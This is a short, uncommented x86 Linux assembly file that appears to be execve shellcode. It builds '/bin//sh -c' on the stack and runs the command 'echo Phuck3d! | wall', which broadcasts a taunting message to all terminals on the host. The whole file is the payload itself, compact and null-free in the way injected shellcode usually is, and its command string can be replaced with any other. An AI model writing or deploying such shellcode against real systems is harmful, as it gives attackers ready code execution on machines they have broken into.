global _start

section .text
_start:

push   0xb
pop    eax
cdq
push   edx
push   0x6c6c6177
push   0x207c2021
push   0x64336b63
push   0x75685020
push   0x6f686365
mov    esi,esp
push   edx
push word  0x632d
mov    ecx,esp
push   edx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
push   edx
push   esi
push   ecx
push   ebx
mov    ecx,esp
int    0x80
